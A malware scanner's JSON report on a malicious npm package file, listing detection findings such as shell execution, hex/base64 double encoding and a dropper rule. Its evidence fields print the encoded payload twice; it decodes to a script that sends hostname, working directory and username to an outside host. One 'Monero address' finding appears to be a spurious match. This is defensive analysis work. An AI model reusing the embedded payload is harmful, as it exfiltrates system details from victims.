{"type":"file","id":0,"path":"/home/t.linux/data/known-bad/datasets/malcontent-samples/npm/2024.hlwgirl/index.js","depth":0,"file_type":"javascript","sha256":"7a9538fe5f97200e827d7723dcfc24b58d1d0b4f98049c46d856308712d40e1f","size":4591,"risk":"hostile","counts":{"hostile":1,"suspicious":2,"notable":10},"findings":[{"id":"cap/data/encode/base64::buffer-from-base64","kind":"capability","desc":"Base64 decoding/usage via Buffer.from","conf":0.8,"crit":"inert","evidence":[{"method":"ast_query","source":"tree-sitter","value":"Buffer","location":"20:14"},{"method":"ast_query","source":"tree-sitter","value":"from","location":"20:21"},{"method":"ast_query","source":"tree-sitter","value":"'base64'","location":"20:40"}]},{"id":"cap/data/encode/hex::buffer-from-hex","kind":"capability","desc":"Hex decoding/usage via Buffer.from","conf":0.8,"crit":"inert","evidence":[{"method":"ast_query","source":"tree-sitter","value":"Buffer","location":"11:20"},{"method":"ast_query","source":"tree-sitter","value":"from","location":"11:27"},{"method":"ast_query","source":"tree-sitter","value":"'hex'","location":"11:50"}]},{"id":"cap/exec/command/shell::js-exec","kind":"capability","desc":"Executes shell commands","conf":1.0,"crit":"notable","evidence":[{"method":"symbol","source":"ast","value":"exec","location":"import"}]},{"id":"cap/exec/command/shell::child-process-require","kind":"capability","desc":"Node.js child_process module import","conf":0.8,"crit":"notable","mbc":"C0017","attack":"T1059","evidence":[{"method":"string","source":"string_extractor","value":"child_process","location":"0x19"},{"method":"string","source":"string_extractor","value":"child_process","location":"0x1a"}]},{"id":"cap/exec/vm/sandbox::buffer-from-call","kind":"capability","desc":"Buffer.from conversion","conf":0.4,"crit":"inert","evidence":[{"method":"import_symbol","source":"ast","value":"Buffer.from"},{"method":"import_symbol","source":"ast","value":"Buffer.from"}]},{"id":"cap/exec/vm/sandbox::base64-long-string","kind":"capability","desc":"Long base64-like string pattern","conf":0.4,"crit":"inert","evidence":[{"method":"string","source":"string_extractor","value":"59323975633351676579426C6547566A49483067505342795A58463161584A6C4B434A6A61476C735A463977636D396A5A584E7A49696B37436D4E76626E4E30494768306448427A49443067636D567864576C795A53676E6148523063484D6E4B54734B43693876494556345A574E31644755676332686C6247776759323974625746755A484D67644738675A32563049484E356333526C62534270626D5A76636D316864476C766267706C6547566A4B43646F62334E30626D46745A53416D4A694277643251674A69596764326876595731704A7977674B475679636D39794C43427A644752766458517349484E305A47567963696B675054346765776F6749434167615759674B475679636D39794B53423743694167494341674943416759323975633239735A53356C636E4A76636967695258686C593356306157397549475679636D39794F69497349475679636D39794C6D316C63334E685A3255704F776F67494341674943416749484A6C64485679626A734B494341674948304B4943416749416F67494341674C79386752586830636D466A6443427A65584E305A5730676157356D62334A74595852706232344B4943416749474E76626E4E304946746F62334E30626D46745A5377675933646B4C43423163325679626D46745A5630675053427A644752766458517564484A70625367704C6E4E7762476C304B436463626963704F776F4B4943416749433876494642795A584268636D55675A4746305953426D6233496755453954564342795A5846315A584E30436941674943426A6232357A6443426B5958526849443067536C4E505469357A64484A70626D64705A6E6B6F65776F67494341674943416749476876633352755957316C4C416F67494341674943416749475270636D566A6447397965546F675933646B4C416F6749434167494341674948567A5A5849364948567A5A584A755957316C43694167494342394B54734B43694167494341764C7942455A575A70626D556762334230615739756379426D623349676447686C494568555646425449484A6C6358566C6333514B4943416749474E76626E4E304947397764476C76626E4D67505342374369416749434167494341676147397A64473568625755364943647959584A305A6E5A3461326C3561326436625778336148466A616D56344E3342354D484D34626D7068646E59756232467A6443356D6457346E4C416F67494341674943416749484276636E5136494451304D79774B4943416749434167494342775958526F4F69416E4C796373436941674943416749434167625756306147396B4F69416E5545395456436373436941674943416749434167614756685A475679637A6F6765776F674943416749434167494341674943416E5132397564475675644331556558426C4A7A6F674A3246776347787059324630615739754C32707A6232346E4C416F674943416749434167494341674943416E51323975644756756443314D5A57356E6447676E4F69426B595852684C6D786C626D643061416F6749434167494341674948304B494341674948303743676F67494341674C793867553256755A434230614755675346525555464D67636D56786457567A64416F67494341675932397563335167636D5678494430676148523063484D75636D56786457567A64436876634852706232357A4C43416F636D567A4B534139506942374369416749434167494341676247563049484A6C63334276626E4E6C494430674A796337436941674943416749434167636D567A4C6D39754B43646B595852684A7977674B474E6F645735724B534139506942374369416749434167494341674943416749484A6C63334276626E4E6C4943733949474E6F645735724F776F674943416749434167494830704F776F4B4943416749434167494342795A584D756232346F4A3256755A436373494367704944302B4948734B4943416749434167494341674943416759323975633239735A5335736232636F4A314A6C63334276626E4E6C4F69637349484A6C63334276626E4E6C4B54734B4943416749434167494342394B54734B49434167494830704F776F4B4943416749484A6C635335766269676E5A584A796233496E4C43416F5A536B675054346765776F67494341674943416749474E76626E4E76624755755A584A796233496F5946427962324A735A57306764326C30614342795A5846315A584E304F69416B653255756257567A6332466E5A5831674B54734B49434167494830704F776F4B4943416749484A6C63533533636D6C305A53686B595852684B54734B4943416749484A6C6353356C626D516F4B54734B66536B3743673D3D","location":"0xb7"},{"method":"string","source":"string_extractor","value":"59323975633351676579426C6547566A49483067505342795A58463161584A6C4B434A6A61476C735A463977636D396A5A584E7A49696B37436D4E76626E4E30494768306448427A49443067636D567864576C795A53676E6148523063484D6E4B54734B43693876494556345A574E31644755676332686C6247776759323974625746755A484D67644738675A32563049484E356333526C62534270626D5A76636D316864476C766267706C6547566A4B43646F62334E30626D46745A53416D4A694277643251674A69596764326876595731704A7977674B475679636D39794C43427A644752766458517349484E305A47567963696B675054346765776F6749434167615759674B475679636D39794B53423743694167494341674943416759323975633239735A53356C636E4A76636967695258686C593356306157397549475679636D39794F69497349475679636D39794C6D316C63334E685A3255704F776F67494341674943416749484A6C64485679626A734B494341674948304B4943416749416F67494341674C79386752586830636D466A6443427A65584E305A5730676157356D62334A74595852706232344B4943416749474E76626E4E304946746F62334E30626D46745A5377675933646B4C43423163325679626D46745A5630675053427A644752766458517564484A70625367704C6E4E7762476C304B436463626963704F776F4B4943416749433876494642795A584268636D55675A4746305953426D6233496755453954564342795A5846315A584E30436941674943426A6232357A6443426B5958526849443067536C4E505469357A64484A70626D64705A6E6B6F65776F67494341674943416749476876633352755957316C4C416F67494341674943416749475270636D566A6447397965546F675933646B4C416F6749434167494341674948567A5A5849364948567A5A584A755957316C43694167494342394B54734B43694167494341764C7942455A575A70626D556762334230615739756379426D623349676447686C494568555646425449484A6C6358566C6333514B4943416749474E76626E4E304947397764476C76626E4D67505342374369416749434167494341676147397A64473568625755364943647959584A305A6E5A3461326C3561326436625778336148466A616D56344E3342354D484D34626D7068646E59756232467A6443356D6457346E4C416F67494341674943416749484276636E5136494451304D79774B4943416749434167494342775958526F4F69416E4C796373436941674943416749434167625756306147396B4F69416E5545395456436373436941674943416749434167614756685A475679637A6F6765776F674943416749434167494341674943416E5132397564475675644331556558426C4A7A6F674A3246776347787059324630615739754C32707A6232346E4C416F674943416749434167494341674943416E51323975644756756443314D5A57356E6447676E4F69426B595852684C6D786C626D643061416F6749434167494341674948304B494341674948303743676F67494341674C793867553256755A434230614755675346525555464D67636D56786457567A64416F67494341675932397563335167636D5678494430676148523063484D75636D56786457567A64436876634852706232357A4C43416F636D567A4B534139506942374369416749434167494341676247563049484A6C63334276626E4E6C494430674A796337436941674943416749434167636D567A4C6D39754B43646B595852684A7977674B474E6F645735724B534139506942374369416749434167494341674943416749484A6C63334276626E4E6C4943733949474E6F645735724F776F674943416749434167494830704F776F4B4943416749434167494342795A584D756232346F4A3256755A436373494367704944302B4948734B4943416749434167494341674943416759323975633239735A5335736232636F4A314A6C63334276626E4E6C4F69637349484A6C63334276626E4E6C4B54734B4943416749434167494342394B54734B49434167494830704F776F4B4943416749484A6C635335766269676E5A584A796233496E4C43416F5A536B675054346765776F67494341674943416749474E76626E4E76624755755A584A796233496F5946427962324A735A57306764326C30614342795A5846315A584E304F69416B653255756257567A6332466E5A5831674B54734B49434167494830704F776F4B4943416749484A6C63533533636D6C305A53686B595852684B54734B4943416749484A6C6353356C626D516F4B54734B66536B3743673D3D","location":"0xb8"}]},{"id":"cap/fs/write/file::write-file-sync","kind":"capability","desc":"Writes to file synchronously","conf":0.8,"crit":"inert","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 .writeFileSync(","location":"file"}]},{"id":"cap/process/exit/terminate::process-exit","kind":"capability","desc":"Node.js process.exit call","conf":0.3,"crit":"inert","evidence":[{"method":"import_symbol","source":"ast","value":"process.exit"}]},{"id":"obj/anti-static/obfuscation/code-metrics::js-webpack-minified","kind":"capability","desc":"Webpack/bundler minified output pattern","conf":0.7,"crit":"notable","mbc":"B0032","attack":"T1027","evidence":[{"method":"metrics","source":"analyzer","value":"text.max_line_length = 3452.00"}]},{"id":"obj/anti-static/obfuscation/code-metrics/structure::very-long-lines","kind":"capability","desc":"Very long lines (>1000 chars)","conf":0.85,"crit":"notable","mbc":"B0032","attack":"T1027","evidence":[{"method":"metrics","source":"analyzer","value":"text.max_line_length = 3452.00"}]},{"id":"obj/anti-static/obfuscation/code-metrics/structure::low-whitespace","kind":"capability","desc":"Very low whitespace ratio (minified/compressed)","conf":0.7,"crit":"notable","mbc":"B0032","attack":"T1027","evidence":[{"method":"metrics","source":"analyzer","value":"text.whitespace_ratio = 0.04"}]},{"id":"obj/anti-static/obfuscation/strings/encoding::js-buffer-from-base64","kind":"capability","desc":"Buffer.from base64","conf":0.6,"crit":"inert","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(base64Script, 'base64')","location":"file"}]},{"id":"obj/anti-static/obfuscation/strings/encoding::js-buffer-from-hex","kind":"capability","desc":"Buffer.from hex","conf":0.6,"crit":"inert","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(hexEncodedBase64, 'hex')","location":"file"}]},{"id":"obj/c2/dropper/stealth-spawn::path-join-dirname","kind":"capability","desc":"path.join with __dirname","conf":0.5,"crit":"inert","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 path.join(__dirname","location":"file"}]},{"id":"obj/c2/dropper/stealth-spawn::local-script-path","kind":"capability","desc":"Local script path reference","conf":0.7,"crit":"notable","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 __dirname, 'main.js'","location":"file"}]},{"id":"obj/collect/clipboard/capture::monero-address","kind":"capability","desc":"Monero address embedded","conf":0.8,"crit":"notable","attack":"T1649","evidence":[{"method":"string","source":"string_extractor","value":"484D6E4B54734B43693876494556345A574E31644755676332686C6247776759323974625746755A484D67644738675","location":"0xb7"},{"method":"string","source":"string_extractor","value":"484D6E4B54734B43693876494556345A574E31644755676332686C6247776759323974625746755A484D67644738675","location":"0xb8"}]},{"id":"obj/impact/ransomware/behavior::writefile-sync","kind":"capability","desc":"writeFileSync function","conf":0.4,"crit":"inert","attack":"T1486","evidence":[{"method":"import_symbol","source":"ast","value":"writeFileSync"}]},{"id":"obj/impact/ransomware/behavior::writefile-fn","kind":"capability","desc":"writeFile function","conf":0.4,"crit":"inert","attack":"T1486","evidence":[{"method":"import_symbol","source":"ast","value":"writeFile"}]},{"id":"obj/lateral/supply-chain/npm/behavior::require-child-process","kind":"capability","desc":"require('child_process') import","conf":0.8,"crit":"notable","evidence":[{"method":"ast_query","source":"tree-sitter","value":"require","location":"1:18"},{"method":"ast_query","source":"tree-sitter","value":"'child_process'","location":"1:26"}]},{"id":"obj/lateral/supply-chain/npm/behavior::require-fs","kind":"capability","desc":"require('fs') import","conf":0.7,"crit":"inert","evidence":[{"method":"ast_query","source":"tree-sitter","value":"require","location":"2:12"},{"method":"ast_query","source":"tree-sitter","value":"'fs'","location":"2:20"}]},{"id":"obj/lateral/supply-chain/npm/behavior::small-file-5k","kind":"capability","desc":"Small file under 5KB","conf":0.7,"crit":"inert","evidence":[{"method":"basename","source":"target","value":"index.js"}]},{"id":"obj/lateral/supply-chain/npm/malicious-patterns::side-effect-only","kind":"capability","desc":"Module produces side effects without","conf":0.8,"crit":"notable","evidence":[{"method":"yara","source":"yara-x","value":"require('fs')","location":"offset:54"},{"method":"yara","source":"yara-x","value":"exec(","location":"offset:4360"},{"method":"yara","source":"yara-x","value":"child_process","location":"offset:26"}]},{"id":"obj/lateral/supply-chain/vscode::exec-pattern","kind":"capability","desc":"exec function pattern","conf":0.7,"crit":"inert","evidence":[{"method":"import_symbol","source":"ast","value":"exec"}]},{"id":"obj/lateral/supply-chain/vscode::file-write-ops","kind":"capability","desc":"File write or copy operations","conf":1.0,"crit":"inert","evidence":[{"method":"import_symbol","source":"ast","value":"writeFile"}]},{"id":"cap/exec/dropper/loader::file-write","kind":"capability","desc":"File write operation","conf":0.7,"crit":"inert","mbc":"B0024","attack":"T1059.007","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 .writeFileSync(","location":"file"}]},{"id":"cap/fs/write/file::js-file-write","kind":"capability","desc":"JavaScript file write operation","conf":0.9,"crit":"inert","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 .writeFileSync(","location":"file"}]},{"id":"obj/anti-static/obfuscation/strings/encoding::js-double-encoding","kind":"capability","desc":"Double encoding usage (Hex and Base64)","conf":0.95,"crit":"suspicious","mbc":"B0032","attack":"T1027","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(base64Script, 'base64')","location":"file"},{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(hexEncodedBase64, 'hex')","location":"file"}]},{"id":"obj/exec/condition/platform::has-execution-capability","kind":"capability","desc":"Has code execution capability","conf":0.6,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"exec","location":"import"},{"method":"string","source":"string_extractor","value":"child_process","location":"0x19"},{"method":"string","source":"string_extractor","value":"child_process","location":"0x1a"}]},{"id":"obj/impact/ransomware/behavior::file-write-functions","kind":"capability","desc":"File write functions","conf":0.4,"crit":"inert","attack":"T1486","evidence":[{"method":"import_symbol","source":"ast","value":"writeFileSync"},{"method":"import_symbol","source":"ast","value":"writeFile"}]},{"id":"obj/lateral/supply-chain/npm/install::fs-imports","kind":"capability","desc":"File system imports","conf":0.5,"crit":"inert","attack":"T1195.002","evidence":[{"method":"ast_query","source":"tree-sitter","value":"require","location":"2:12"},{"method":"ast_query","source":"tree-sitter","value":"'fs'","location":"2:20"}]},{"id":"obj/lateral/supply-chain/npm/install::child-process-imports","kind":"capability","desc":"Child process execution imports","conf":0.7,"crit":"notable","attack":"T1195.002","evidence":[{"method":"ast_query","source":"tree-sitter","value":"require","location":"1:18"},{"method":"ast_query","source":"tree-sitter","value":"'child_process'","location":"1:26"}]},{"id":"obj/exec/dropper/behavior::local-dropper","kind":"capability","desc":"Writes a file and executes it locally","conf":0.85,"crit":"suspicious","attack":"T1105","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 .writeFileSync(","location":"file"},{"method":"symbol","source":"ast","value":"exec","location":"import"}]},{"id":"obj/exec/dropper/behavior::obfuscated-local-dropper","kind":"capability","desc":"Obfuscated local dropper (Hostile)","conf":0.95,"crit":"hostile","mbc":"B0032","attack":"T1027","evidence":[{"method":"raw","source":"raw_content","value":"Found 1 .writeFileSync(","location":"file"},{"method":"symbol","source":"ast","value":"exec","location":"import"},{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(base64Script, 'base64')","location":"file"},{"method":"raw","source":"raw_content","value":"Found 1 Buffer.from(hexEncodedBase64, 'hex')","location":"file"}]},{"id":"meta/internal/imported::scriptpath","kind":"structural","desc":"calls scriptPath","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"scriptPath"}]},{"id":"meta/internal/imported::process/exit","kind":"structural","desc":"calls process.exit","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"process.exit"}]},{"id":"meta/internal/imported::path/join","kind":"structural","desc":"calls path.join","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"path.join"}]},{"id":"meta/internal/imported::exec","kind":"structural","desc":"calls exec","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"exec"}]},{"id":"meta/internal/imported::hexencodedbase64","kind":"structural","desc":"calls hexEncodedBase64","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"hexEncodedBase64"}]},{"id":"meta/internal/imported::require","kind":"structural","desc":"calls require","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"require"}]},{"id":"meta/internal/imported::console/log","kind":"structural","desc":"calls console.log","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"console.log"}]},{"id":"meta/internal/imported::fs","kind":"structural","desc":"calls fs","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"fs"}]},{"id":"meta/internal/imported::buffer/from","kind":"structural","desc":"calls Buffer.from","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"Buffer.from"}]},{"id":"meta/internal/imported::path","kind":"structural","desc":"calls path","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"path"}]},{"id":"meta/internal/imported::script","kind":"structural","desc":"calls script","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"script"}]},{"id":"meta/internal/imported::buffer/from/tostring","kind":"structural","desc":"calls Buffer.from.toString","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"Buffer.from.toString"}]},{"id":"meta/internal/imported::base64script","kind":"structural","desc":"calls base64Script","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"base64Script"}]},{"id":"meta/internal/imported::console/error","kind":"structural","desc":"calls console.error","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"console.error"}]},{"id":"meta/internal/imported::fs/writefilesync","kind":"structural","desc":"calls fs.writeFileSync","conf":0.95,"crit":"inert","evidence":[{"method":"symbol","source":"ast","value":"fs.writeFileSync"}]}]}
